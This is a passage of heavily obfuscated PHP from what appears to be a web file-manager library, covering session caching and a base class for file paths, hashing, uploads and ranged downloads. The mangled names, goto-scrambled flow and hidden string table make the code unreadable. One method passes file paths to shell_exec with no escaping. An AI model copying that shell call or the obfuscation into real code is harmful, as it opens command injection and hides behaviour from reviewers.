$aµ«®–±ÔŒ = $cåÏ”¯²Ö†[$B…Ó‰ ß‹£[749]]; goto D•‡•‘ÀŠ‘; e¼™½ÍÖÙ‰: $c¯éï‚· = _get($GLOBALS, $B…Ó‰ ß‹£[1370], $c¯éï‚·); if (self::$sessionSign) { } else { if (Cookie::get($c¯éï‚·)) { self::$sessionSign = Cookie::get($c¯éï‚·); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c¯éï‚·, self::$sessionSign, self::$sessionTime); goto BˆööŒ¦; D•‡•‘ÀŠ‘: switch ($E…´µ°ªö) { case $B…Ó‰ ß‹£[17]: self::$handle = Model($B…Ó‰ ß‹£[750]); break; case $B…Ó‰ ß‹£[751]: self::$handle = new CacheRedis($c“È‰¿æ¿, $aµ«®–±ÔŒ); break; case $B…Ó‰ ß‹£[752]: self::$handle = new CacheMemcached($c“È‰¿æ¿, $aµ«®–±ÔŒ); break; case $B…Ó‰ ß‹£[164]: $c“È‰¿æ¿[$B…Ó‰ ß‹£[75]] = $c“È‰¿æ¿[$B…Ó‰ ß‹£[75]] . $B…Ó‰ ß‹£[1372]; self::$handle = new CacheFile($c“È‰¿æ¿, $aµ«®–±ÔŒ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E‰§…¡Ù = new self(); goto BÇ‡†ˆ†×™; BÇ‡†ˆ†×™: return $E‰§…¡Ù; goto B¥¿¼ÊâÂ; B¥¿¼ÊâÂ: } public static function sign($dÕÃ–Ôİ¨“ = false) { $dÕÃ–Ôİ¨“ && (self::$sessionSign = $dÕÃ–Ôİ¨“); self::init(); return self::$sessionSign; } public static function set($c³®™¦¨­, $Dè¥‡Íéù‹ = false) { self::init(); if (is_array($c³®™¦¨­)) { foreach ($c³®™¦¨­ as $a‰¸­¡µê× => $E‰‹´‹’†á) { array_set_value(self::$data, $a‰¸­¡µê×, $E‰‹´‹’†á); } } else { array_set_value(self::$data, $c³®™¦¨­, $Dè¥‡Íéù‹); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fÖß§ïªß = false) { self::init(); if (!$fÖß§ïªß) { return self::$data; } return array_get_value(self::$data, $fÖß§ïªß); } public static function remove($fÓå‹íµî¶) { self::init(); unset(self::$data[$fÓå‹íµî¶]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÚŠ•´ÍéÒÑÔ][754])) { self::$handle->clearTimeout(); } } } goto C ¼ÒÊâ·; EˆÄ·‹Õ¨‰: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $DÂÂ—Ÿ—ò— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->objectDriver = array($DÂÂ—Ÿ—ò—[57], $DÂÂ—Ÿ—ò—[58], $DÂÂ—Ÿ—ò—[59], $DÂÂ—Ÿ—ò—[60], $DÂÂ—Ÿ—ò—[61], $DÂÂ—Ÿ—ò—[62], $DÂÂ—Ÿ—ò—[63], $DÂÂ—Ÿ—ò—[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($F¸Ç‡•õ¢£) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($F¸Ç‡•õ¢£, $_SERVER[ÚŠ•´ÍéÒÑÔ][8]); } return $F¸Ç‡•õ¢£; } public function getPathName($FàòØ×ÖØ) { return $FàòØ×ÖØ; } public function iconvApp($F˜îÁ‹—›) { return $F˜îÁ‹—›; } public function iconvSystem($E‚¶¤ÃÌ¥É) { return $E‚¶¤ÃÌ¥É; } public function iconvTo($d°½Ï”ÖøÂ, $eÊ¹ÚÁÌ‰‹, $Få§¼ÛÜè‰) { goto d¨ƒ»’Ğ˜; d¨ƒ»’Ğ˜: $c‡óçÄõ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$d°½Ï”ÖøÂ || !function_exists($c‡óçÄõ[65])) { return $d°½Ï”ÖøÂ; } static $cÈç—äô°œ = array(); goto d‘…²°ÑÃ; d‘…²°ÑÃ: $D« ™Õ± = $eÊ¹ÚÁÌ‰‹ . $c‡óçÄõ[66] . $Få§¼ÛÜè‰ . $c‡óçÄõ[67] . $d°½Ï”ÖøÂ; if (isset($cÈç—äô°œ[$D« ™Õ±])) { return $cÈç—äô°œ[$D« ™Õ±]; } if (function_exists($c‡óçÄõ[68])) { $eÛ‹íÔÀÃ = @mb_convert_encoding($d°½Ï”ÖøÂ, $Få§¼ÛÜè‰, $eÊ¹ÚÁÌ‰‹); } else { $eÛ‹íÔÀÃ = @iconv($eÊ¹ÚÁÌ‰‹, $Få§¼ÛÜè‰, $d°½Ï”ÖøÂ); } goto D“Çğ¼æ; E‹¤ëåõËè: return $eÛ‹íÔÀÃ; goto fØŞİâ„¼; D“Çğ¼æ: $eÛ‹íÔÀÃ = $eÛ‹íÔÀÃ ? $eÛ‹íÔÀÃ : $d°½Ï”ÖøÂ; if (strstr($eÛ‹íÔÀÃ, $c‡óçÄõ[69])) { $eÛ‹íÔÀÃ = str_replace($c‡óçÄõ[69], $c‡óçÄõ[70], $eÛ‹íÔÀÃ); } $cÈç—äô°œ[$eÊ¹ÚÁÌ‰‹ . $c‡óçÄõ[66] . $Få§¼ÛÜè‰ . $c‡óçÄõ[67] . $d°½Ï”ÖøÂ] = $eÛ‹íÔÀÃ; goto a—ñŸ©éÂ¾; a—ñŸ©éÂ¾: $cÈç—äô°œ[$Få§¼ÛÜè‰ . $c‡óçÄõ[66] . $eÊ¹ÚÁÌ‰‹ . $c‡óçÄõ[67] . $d°½Ï”ÖøÂ] = $d°½Ï”ÖøÂ; $cÈç—äô°œ[$Få§¼ÛÜè‰ . $c‡óçÄõ[66] . $eÊ¹ÚÁÌ‰‹ . $c‡óçÄõ[67] . $eÛ‹íÔÀÃ] = $d°½Ï”ÖøÂ; $cÈç—äô°œ[$eÊ¹ÚÁÌ‰‹ . $c‡óçÄõ[66] . $Få§¼ÛÜè‰ . $c‡óçÄõ[67] . $eÛ‹íÔÀÃ] = $eÛ‹íÔÀÃ; goto E‹¤ëåõËè; fØŞİâ„¼: } public function getPathInner($CŒ¢İ½ÏÁ») { $bí×Û‰Ë­ä = IO::init($CŒ¢İ½ÏÁ»); return $bí×Û‰Ë­ä->path; } public function getPathOuter($Cğ¡“á×µ) { $f›ïÛ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DØ’ÓÖ·ËÊ = strlen(trim($this->pathBase, $f›ïÛ[8])); $Cğ¡“á×µ = substr(trim($Cğ¡“á×µ, $f›ïÛ[8]), $DØ’ÓÖ·ËÊ); return $this->pathDriver . $f›ïÛ[8] . ltrim($Cğ¡“á×µ, $f›ïÛ[8]); } public function isParentOf($AŸÊäª¡÷, $C›í×ÑÏïÛ) { $fœ¾¡İ¯ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AŸÊäª¡÷ = rtrim(strtolower($AŸÊäª¡÷), $fœ¾¡İ¯ì[8]) . $fœ¾¡İ¯ì[8]; $C›í×ÑÏïÛ = rtrim(strtolower($C›í×ÑÏïÛ), $fœ¾¡İ¯ì[8]) . $fœ¾¡İ¯ì[8]; $d÷¿½©‡Ê† = strpos($C›í×ÑÏïÛ, $AŸÊäª¡÷) === 0; return $d÷¿½©‡Ê†; } public function getType() { $fàÛ­œÇ©ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C™¢¸Ú²é = str_replace($fàÛ­œÇ©ë[71], $fàÛ­œÇ©ë[33], get_class($this)); return strtolower($C™¢¸Ú²é); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($eù‰¿¯ Û, $eÔ²„í±–«) { $E¼æ«´Ìé÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eõÕ©Ä¯ÈÒ = rtrim($eù‰¿¯ Û, $E¼æ«´Ìé÷[8]) . $E¼æ«´Ìé÷[8] . $eÔ²„í±–«; $Eâòá’­º = $this->exist($eõÕ©Ä¯ÈÒ); return $Eâòá’­º ? $eõÕ©Ä¯ÈÒ : !1; } public function renameObject($CÓ‚‹œ•Æ, $fÎ¿¤í²˜Å) { goto AÇ•ì¢ò¸İ; aåÌ®ĞÕæ¥: $CÓ‚‹œ•Æ = $this->getPathOuter($CÓ‚‹œ•Æ); $fÎ¿¤í²˜Å = $this->pathFather($CÓ‚‹œ•Æ) . $fÎ¿¤í²˜Å; if (IO::isFile($CÓ‚‹œ•Æ)) { $e¨—’©ää» = IO::copy($CÓ‚‹œ•Æ, $this->pathFather($CÓ‚‹œ•Æ), REPEAT_RENAME_FOLDER, $BÛç¢†İ¨); if ($e¨—’©ää») { IO::remove($CÓ‚‹œ•Æ); } } else { $e¨—’©ää» = IO::mkdir($fÎ¿¤í²˜Å); if (!$e¨—’©ää») { return !1; } $bÍãÓÄÈ¦î = IO::listPath($CÓ‚‹œ•Æ, !0); $FÊÊã¿î° = array_merge($bÍãÓÄÈ¦î[$DÔÆº–êÂé[73]], $bÍãÓÄÈ¦î[$DÔÆº–êÂé[74]]); foreach ($FÊÊã¿î° as $døØ‚§ŸÃ¹) { IO::move($døØ‚§ŸÃ¹[$DÔÆº–êÂé[75]], $fÎ¿¤í²˜Å, REPEAT_RENAME_FOLDER); } IO::remove($CÓ‚‹œ•Æ); } goto ašŸÊÊË¹; ašŸÊÊË¹: return $e¨—’©ää» ? $fÎ¿¤í²˜Å : !1; goto bÊ¡ìØ…®Ä; AÇ•ì¢ò¸İ: $DÔÆº–êÂé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÛç¢†İ¨ = $fÎ¿¤í²˜Å; Hook::trigger($DÔÆº–êÂé[72], $this, $CÓ‚‹œ•Æ, $this, $this->pathFather($CÓ‚‹œ•Æ) . $fÎ¿¤í²˜Å); goto aåÌ®ĞÕæ¥; bÊ¡ìØ…®Ä: } public function tempFile($fõÑ„— ïä = '', $d÷Ä‡ÒÈ©Š = '') { goto c†Î°Œ¥ò; F—ñ­ùÔ…š: $eöí´Œ›´Ù = $B¼¥ÏÂŒ¾¶ . $fõÑ„— ïä; @touch($eöí´Œ›´Ù); if ($d÷Ä‡ÒÈ©Š) { file_put_contents($eöí´Œ›´Ù, $d÷Ä‡ÒÈ©Š); } goto A‚§£Ÿ½“‡; c†Î°Œ¥ò: if (!$fõÑ„— ïä) { $fõÑ„— ïä = rand_string(15); } $B¼¥ÏÂŒ¾¶ = TEMP_FILES . rand_string(15) . $_SERVER[ÚŠ•´ÍéÒÑÔ][8]; @mkdir($B¼¥ÏÂŒ¾¶, 511, !0); goto F—ñ­ùÔ…š; A‚§£Ÿ½“‡: return $eöí´Œ›´Ù; goto f’é®ê¥; f’é®ê¥: } public function tempFileRemve($f¤ß·àÒ¸¦) { @unlink($f¤ß·àÒ¸¦); @rmdir($this->pathFather($f¤ß·àÒ¸¦)); } public function mkfile($FÑ òŒè©Ù, $b‡Ã¸¦»‰ = '', $A’Å˜•‚Ì = REPEAT_RENAME) { } public function mkdir($dÂŸÊ‹²Æ¼, $a»Èí´© = REPEAT_SKIP) { } public function copyFile($C†¡ÍÇ¤á‚, $aöêÙŒ±„) { } public function moveFile($aÑ²ñ¹‘ŸÏ, $Dä“¾™µñá) { } public function remove($B¦ÚßÂ«ôê) { if ($this->isFile($B¦ÚßÂ«ôê)) { return $this->delFile($B¦ÚßÂ«ôê); } return $this->delFolder($B¦ÚßÂ«ôê); } public function rename($eø´²Å‡Ô¹, $eÁ•™¥”ò) { } public function exist($aÖƒùªÄ™‘) { } public function findByHash($Fôô”£âŸ = '', $eÏ‰‰œ•—İ = '') { return !1; } public function isFile($aæÀšÇæô¦) { } public function isFolder($cÕ‘’È¢ùë) { } public function size($aÆŠ‚ôÙëñ) { } public function info($dœ£Ÿ—‚È) { } public function infoSimple($Cœ·ÈÎøÎ) { return $this->info($Cœ·ÈÎøÎ); } public function infoAuth($B‰Úö‘ö‰) { return $this->info($B‰Úö‘ö‰); } public function infoFull($B´ÃŞà±Ä) { return $this->info($B´ÃŞà±Ä); } public function infoWithChildren($C´Ş¯óÖ„) { $AÍ‡¿Æóé¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aá×ï‰¥ÁÔ = $this->info($C´Ş¯óÖ„); if ($aá×ï‰¥ÁÔ && $aá×ï‰¥ÁÔ[$AÍ‡¿Æóé¤[29]] == $AÍ‡¿Æóé¤[76]) { $FÛ¥…¶Âé• = array($AÍ‡¿Æóé¤[77] => 0, $AÍ‡¿Æóé¤[78] => 0, $AÍ‡¿Æóé¤[79] => 0); $this->infoChildren($C´Ş¯óÖ„, $FÛ¥…¶Âé•); $aá×ï‰¥ÁÔ[$AÍ‡¿Æóé¤[77]] = $FÛ¥…¶Âé•[$AÍ‡¿Æóé¤[77]]; $aá×ï‰¥ÁÔ[$AÍ‡¿Æóé¤[80]] = array($AÍ‡¿Æóé¤[81] => $FÛ¥…¶Âé•[$AÍ‡¿Æóé¤[78]], $AÍ‡¿Æóé¤[82] => $FÛ¥…¶Âé•[$AÍ‡¿Æóé¤[79]]); } return $aá×ï‰¥ÁÔ; } public function listPath($BáßãØé”Ú, $A°¦ÛÏ³‰› = false) { } public function has($CéõÙã¯Ä, $f†ËóôŠ’ = false, $Fëó–óÜù‡ = false) { } public function canRead($aäï¢’Õ’ˆ) { } public function canWrite($E¬¯ÉâæÅ) { } public function getContent($F±¹™¶˜¥ä) { } public function setContent($C––ÏÏöƒõ, $bÕóíØ¼†Ñ = '') { } protected function infoChildren($Bô–˜×ËÌÔ, &$F­çÆŞ¤ß) { $bÏŞ®¬ë¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; check_abort(); $c„¾ĞâËÏ = $this->listPath($Bô–˜×ËÌÔ, !0); $c„¾ĞâËÏ = array_merge($c„¾ĞâËÏ[$bÏŞ®¬ë¼[74]], $c„¾ĞâËÏ[$bÏŞ®¬ë¼[73]]); foreach ($c„¾ĞâËÏ as $EŞÓƒ‚ÒÀÛ) { if ($EŞÓƒ‚ÒÀÛ[$bÏŞ®¬ë¼[29]] == $bÏŞ®¬ë¼[76]) { $F­çÆŞ¤ß[$bÏŞ®¬ë¼[79]]++; $eÕ­½Á¹ëÎ = $this->getPathInner($EŞÓƒ‚ÒÀÛ[$bÏŞ®¬ë¼[75]]); $this->infoChildren($eÕ­½Á¹ëÎ, $F­çÆŞ¤ß); } else { $F­çÆŞ¤ß[$bÏŞ®¬ë¼[78]]++; $F­çÆŞ¤ß[$bÏŞ®¬ë¼[77]] += $EŞÓƒ‚ÒÀÛ[$bÏŞ®¬ë¼[77]]; } } } public function fileSubstr($aÊˆÕ™ù„¤, $F¡°óÌíå, $C„ŒÃçë´Ó) { } public function listAll($AŠ£ïÌ„ÒÊ) { } public function upload($E‹¬åÍ’¾¼, $bÛ§›ÜÖ¥, $e°˜‘â—¾‡ = false, $BˆÎù™İ¶è = REPEAT_REPLACE) { } public function uploadFileByID($c›Éß¹”·, $fÇİ¶Ï”¢, $Cä°ËâÏ¯) { } public function uploadFileByPath($e†¾í·­‚Ø, $d¨ë±¬™Ù½, $fİ‚ˆ©ÔƒÆ = array()) { } public function isUploadServer() { $aµÜ¨—Û…¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $aµÜ¨—Û…¤[83]) { return !0; } return $GLOBALS[$aµÜ¨—Û…¤[6]][$aµÜ¨—Û…¤[84]][$aµÜ¨—Û…¤[85]]; } public function isFileOutServer() { $FŒ±·‚ã­† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $FŒ±·‚ã­†[83]) { return !0; } return $GLOBALS[$FŒ±·‚ã­†[6]][$FŒ±·‚ã­†[84]][$FŒ±·‚ã­†[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F½¼ößôó) { $eéŸÉÈæª¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->isCdnHost()) { return $F½¼ößôó; } return str_replace(trim(get_url_root($F½¼ößôó), $eéŸÉÈæª¯[8]), trim($this->cdnHost, $eéŸÉÈæª¯[8]), $F½¼ößôó); } public function uploadLink($a ƒæ®˜, $C²Ÿ¼¥Ù‚ˆ = 0) { goto Bôë‚“™Ù»; eŠîñ¥ç £: if (!in_array($E”­šñ±ƒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $EÇ”¼Ñ­—‹ = 1024 * 1024 * 10; goto A‘Óë¦ñÖ×; Bôë‚“™Ù»: $A©É¥—œé =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->isUploadServer()) { return; } $E”­šñ±ƒ = $this->getType(); goto eŠîñ¥ç £; dñƒÜ—íîå: if ($E‘îã­×­©) { $E‘îã­×­©[$A©É¥—œé[89]] = $a ƒæ®˜; $E‘îã­×­©[$A©É¥—œé[90]] = $E”­šñ±ƒ; } return $E‘îã­×­©; goto EµÂîÛ¼Œ; A‘Óë¦ñÖ×: $a¨ˆ’ê… = $C²Ÿ¼¥Ù‚ˆ <= $EÇ”¼Ñ­—‹ ? $A©É¥—œé[87] : $A©É¥—œé[88]; $d’œÔåÒÛô = (!$C²Ÿ¼¥Ù‚ˆ ? 1 : ceil($C²Ÿ¼¥Ù‚ˆ / pow(1024, 3))) * 3600 * 4; $E‘îã­×­© = $this->{$a¨ˆ’ê…}($a ƒæ®˜, $d’œÔåÒÛô); goto dñƒÜ—íîå; EµÂîÛ¼Œ: } public function uploadFormData($Eîò°©ƒ·, $e¿³ÙÁ‘Ş = 3600) { } public function multiUploadFormData($BŠåÚ…ì›, $dÍÈİêŒßÍ = 3600) { } public function osChunkSize() { $FÀí—ÃäÍ· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eœº±¤ŞÏë = (double) $GLOBALS[$FÀí—ÃäÍ·[6]][$FÀí—ÃäÍ·[84]][$FÀí—ÃäÍ·[91]][$FÀí—ÃäÍ·[92]]; if (!$Eœº±¤ŞÏë) { $Eœº±¤ŞÏë = 1024 * 84 * 10; } return $Eœº±¤ŞÏë; } public function download($AèØÆß”¶¨, $cÆ–¹§šà) { } public function ext($F”†àÃï½Ä) { $e¢‰¯»‹šÙ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (strpos($F”†àÃï½Ä, $e¢‰¯»‹šÙ[8]) === -1) { $CÛ—Õ´°½× = $F”†àÃï½Ä; } else { $CÛ—Õ´°½× = $this->pathThis($F”†àÃï½Ä); } $fèò™”‹¢á = $e¢‰¯»‹šÙ[33]; if (strstr($CÛ—Õ´°½×, $e¢‰¯»‹šÙ[93])) { $fèò™”‹¢á = substr($CÛ—Õ´°½×, strrpos($CÛ—Õ´°½×, $e¢‰¯»‹šÙ[93]) + 1); $fèò™”‹¢á = strtolower($fèò™”‹¢á); } if (strlen($fèò™”‹¢á) > 3 && preg_match($e¢‰¯»‹šÙ[94], $fèò™”‹¢á, $D»ÔËÔÇ÷İ)) { $fèò™”‹¢á = $e¢‰¯»‹šÙ[33]; } return $fèò™”‹¢á; } public function pathThis($f˜å„œó£†) { $bæóáïÄ‰ñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f˜å„œó£† = str_replace($bæóáïÄ‰ñ[95], $bæóáïÄ‰ñ[8], rtrim($f˜å„œó£†, $bæóáïÄ‰ñ[8])); $FÊØ›©ËÔ¶ = strrpos($f˜å„œó£†, $bæóáïÄ‰ñ[8]); if ($FÊØ›©ËÔ¶ === !1) { return $f˜å„œó£†; } return substr($f˜å„œó£†, $FÊØ›©ËÔ¶ + 1); } public function pathFather($bÈ‚†»—Ü) { $B•¨‹³Ñ é =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÈ‚†»—Ü = str_replace($B•¨‹³Ñ é[95], $B•¨‹³Ñ é[8], rtrim($bÈ‚†»—Ü, $B•¨‹³Ñ é[8])); $bÇì¸ÎŒ = strrpos($bÈ‚†»—Ü, $B•¨‹³Ñ é[8]); if ($bÇì¸ÎŒ === !1) { return $B•¨‹³Ñ é[33]; } return substr($bÈ‚†»—Ü, 0, $bÇì¸ÎŒ + 1); } public function hashSimple($e¦ùÚõÄÍ­) { goto dÌè³à´Ô°; b±Å‚™Ÿ¸”: $b¾»Íò Í¼ .= $this->fileSubstr($e¦ùÚõÄÍ­, $b¥†´´÷›å - $bÅ§ß´íŠ, $bÅ§ß´íŠ); return md5($b¾»Íò Í¼) . $b¥†´´÷›å; goto Bá£¢Ä‹Š; b”ÕËåÌß: $bÅ§ß´íŠ = 200; $eË˜…³¯×¬ = 50; if ($b¥†´´÷›å <= $bÅ§ß´íŠ * $eË˜…³¯×¬) { return $this->hashMd5($e¦ùÚõÄÍ­) . $b¥†´´÷›å; } goto CŠæïñõ‘ï; dÌè³à´Ô°: $Eò¼Ì˜Š­Š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$e¦ùÚõÄÍ­) { return md5($Eò¼Ì˜Š­Š[33]); } $b¥†´´÷›å = $this->size($e¦ùÚõÄÍ­); goto b”ÕËåÌß; CŠæïñõ‘ï: $E¹¦‚ÇßÁã = intval($b¥†´´÷›å / $eË˜…³¯×¬); $b¾»Íò Í¼ = $Eò¼Ì˜Š­Š[33]; for ($B©ÚŞ¬§Éì = 0; $B©ÚŞ¬§Éì < $eË˜…³¯×¬; $B©ÚŞ¬§Éì++) { $b¾»Íò Í¼ .= $this->fileSubstr($e¦ùÚõÄÍ­, $E¹¦‚ÇßÁã * $B©ÚŞ¬§Éì, $bÅ§ß´íŠ); } goto b±Å‚™Ÿ¸”; Bá£¢Ä‹Š: } public static $md5Cache = array(); public function hashMd5($D†Ûƒ²ÈÅ„) { $D†Ûƒ²ÈÅ„ = $this->iconvSystem($D†Ûƒ²ÈÅ„); if (isset(self::$md5Cache[$D†Ûƒ²ÈÅ„])) { return self::$md5Cache[$D†Ûƒ²ÈÅ„]; } self::$md5Cache[$D†Ûƒ²ÈÅ„] = $this->hashMd5Shell($D†Ûƒ²ÈÅ„); if (!self::$md5Cache[$D†Ûƒ²ÈÅ„]) { self::$md5Cache[$D†Ûƒ²ÈÅ„] = @md5_file($D†Ûƒ²ÈÅ„); } return self::$md5Cache[$D†Ûƒ²ÈÅ„]; } private function hashMd5Shell($C½ÍÓÎ¥ƒÂ) { goto DøÍÌ´ø‰; D¹í£¨ñí: $DŠ¬ŞŸ»Ó• = Cache::get($f“ÇŞØŞâº[99]); if (!$DŠ¬ŞŸ»Ó•) { $C‡‚“¹Ê÷„ = BASIC_PATH . $f“ÇŞØŞâº[100]; $CáƒÑËóŠ = md5_file($C‡‚“¹Ê÷„); $DŠ¬ŞŸ»Ó• = $f“ÇŞØŞâº[101]; foreach ($D‰ù·•ëÁİ as $e®×¯ÃßÂ) { $e¤ğï£È™ = shell_exec($e®×¯ÃßÂ . "\40\x22{$C‡‚“¹Ê÷„}\x22"); if ($e¤ğï£È™ && substr(trim($e¤ğï£È™), 0, 32) == $CáƒÑËóŠ) { $DŠ¬ŞŸ»Ó• = $e®×¯ÃßÂ; break; } } Cache::set($f“ÇŞØŞâº[99], $DŠ¬ŞŸ»Ó•, 3600); } if ($DŠ¬ŞŸ»Ó• == $f“ÇŞØŞâº[101]) { return !1; } goto cªÆ¸ò; cªÆ¸ò: $e¤ğï£È™ = shell_exec($DŠ¬ŞŸ»Ó• . "\40\x22{$C½ÍÓÎ¥ƒÂ}\42"); return substr($e¤ğï£È™, 0, 32); goto d©Ï§öïº; DøÍÌ´ø‰: $f“ÇŞØŞâº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!function_exists($f“ÇŞØŞâº[96])) { return !1; } $D‰ù·•ëÁİ = array($f“ÇŞØŞâº[97], $f“ÇŞØŞâº[98]); goto D¹í£¨ñí; d©Ï§öïº: } public function link($d•¿ô¢ÇØ¦) { return $d•¿ô¢ÇØ¦; } public function fileOut($eĞˆ©•é„†, $fÖÁğ¼ÓœÛ = false, $DµÚÀ›’ = false, $D¨îĞ‚Ò  = '') { goto DŸ‹Ğ‘Ä²Í; C‹“èÒœõ: header($EØô™ïÌ¡¬[135] . $D•³ç›ìİÒ); header($EØô™ïÌ¡¬[136]); if (!$fÖÁğ¼ÓœÛ && $E ×ğ°Í == $EØô™ïÌ¡¬[137]) { if ($D•³ç›ìİÒ > 1024 * 1024 * 5) { die; } $dÛ’„ ¾±Ç = $this->getContent($eĞˆ©•é„†); $dÛ’„ ¾±Ç = Html::removeXXS($dÛ’„ ¾±Ç); echo $dÛ’„ ¾±Ç; die; } goto B¸ß‰¢õùî; dÆ»‰²Ò‹Ğ: header($EØô™ïÌ¡¬[125]); header($EØô™ïÌ¡¬[126]); header($EØô™ïÌ¡¬[127]); goto CŒøè‰µä; fÌĞŞ·…˜Ù: $E›‹ÊÂŠÑ² = rawurlencode($eìĞƒøÜƒ±); $E›‹ÊÂŠÑ² = $EØô™ïÌ¡¬[113] . $E›‹ÊÂŠÑ² . $EØô™ïÌ¡¬[117] . $E›‹ÊÂŠÑ²; if ($fÖÁğ¼ÓœÛ) { header($EØô™ïÌ¡¬[118]); header($EØô™ïÌ¡¬[119] . $E›‹ÊÂŠÑ²); } else { header($EØô™ïÌ¡¬[120] . $E›‹ÊÂŠÑ²); } goto EŞ‚Á‹áØŞ; CŒøè‰µä: if (isset($_SERVER[$EØô™ïÌ¡¬[128]]) && strtotime($_SERVER[$EØô™ïÌ¡¬[128]]) == $Bß±ª§´àº[$EØô™ïÌ¡¬[107]]) { header($EØô™ïÌ¡¬[129], !0, 304); die; } if (isset($_SERVER[$EØô™ïÌ¡¬[130]]) && $_SERVER[$EØô™ïÌ¡¬[130]] == $D¨îĞ‚Ò ) { header($EØô™ïÌ¡¬[131] . $D¨îĞ‚Ò , !0, 304); die; } header($EØô™ïÌ¡¬[131] . $D¨îĞ‚Ò ); goto c±‘¦ÏÔ‰; EŞ‚Á‹áØŞ: header($EØô™ïÌ¡¬[121]); header($EØô™ïÌ¡¬[122] . $A¯‰£âß½Ë); header($EØô™ïÌ¡¬[123] . gmdate($EØô™ïÌ¡¬[106], time() + 3600 * 24 * 30) . $EØô™ïÌ¡¬[124]); goto dÆ»‰²Ò‹Ğ; AÃ„èà¤‹›: $AƒØ¬­ôø = 0; if ($F¥…Ö¬ÎÏ) { $AƒØ¬­ôø = intval(1000 * 1000 * ($e÷öÖ³ô§» / $F¥…Ö¬ÎÏ)); } while ($EªîØ¥ Ò„ <= $C¡éñÑ½ó) { $DÛìŞÂä÷ = timeFloat(); check_abort(); $a¶„ÍÈÈà = $C¡éñÑ½ó - $EªîØ¥ Ò„ + 1; if ($a¶„ÍÈÈà <= $e÷öÖ³ô§») { $e÷öÖ³ô§» = $a¶„ÍÈÈà; } echo $this->fileSubstr($eĞˆ©•é„†, $EªîØ¥ Ò„, $e÷öÖ³ô§»); $EªîØ¥ Ò„ += $e÷öÖ³ô§»; if ($e÷öÖ³ô§» == $a¶„ÍÈÈà) { $EªîØ¥ Ò„ = $C¡éñÑ½ó + 1; } if ($AƒØ¬­ôø) { $B¡›Œ‰éò = intval(1000 * 1000 * (timeFloat() - $DÛìŞÂä÷)); $CÎã„ö²æª = $AƒØ¬­ôø - $B¡›Œ‰éò; if ($CÎã„ö²æª > 5) { usleep($CÎã„ö²æª); } } } goto eô‡Ä‡äŸ; fçª’Ş´Ã™: header($EØô™ïÌ¡¬[150] . ($C¡éñÑ½ó - $EªîØ¥ Ò„ + 1)); if ($_SERVER[$EØô™ïÌ¡¬[151]] == $EØô™ïÌ¡¬[152]) { return; } $e÷öÖ³ô§» = 1024 * 100; goto AÃ„èà¤‹›; B¸ß‰¢õùî: $e•‹ñÂ…îñ = strtolower($_SERVER[$EØô™ïÌ¡¬[138]]); if ($D‘„ä¶ÀÕ && $e•‹ñÂ…îñ && $a¿²«ØîÍã) { if (strstr($e•‹ñÂ…îñ, $EØô™ïÌ¡¬[139])) { header($EØô™ïÌ¡¬[140] . $eĞˆ©•é„†); } else { if (strstr($e•‹ñÂ…îñ, $EØô™ïÌ¡¬[141])) { header($EØô™ïÌ¡¬[142] . $eĞˆ©•é„†); } else { if (strstr($e•‹ñÂ…îñ, $EØô™ïÌ¡¬[143])) { header($EØô™ïÌ¡¬[144] . $eĞˆ©•é„†); } } } if ($F¥…Ö¬ÎÏ) { header($EØô™ïÌ¡¬[145] . $F¥…Ö¬ÎÏ); } return; } if (isset($_SERVER[$EØô™ïÌ¡¬[146]])) { if (preg_match($EØô™ïÌ¡¬[147], $_SERVER[$EØô™ïÌ¡¬[146]], $Aä—‹™–Š)) { $EªîØ¥ Ò„ = intval($Aä—‹™–Š[1]); if (!empty($Aä—‹™–Š[2])) { $C¡éñÑ½ó = intval($Aä—‹™–Š[2]); } } header($EØô™ïÌ¡¬[148]); header("\103\x6f\x6e\164\145\156\x74\x2d\122\141\156\147\x65\x3a\x20\142\x79\164\x65\x73\x20{$EªîØ¥ Ò„}\55{$C¡éñÑ½ó}\x2f" . $D•³ç›ìİÒ); } else { header($EØô™ïÌ¡¬[149]); } goto fçª’Ş´Ã™; AùùÀ£‘ïÏ: $A¯‰£âß½Ë = get_file_mime($E ×ğ°Í); if (strstr($A¯‰£âß½Ë, 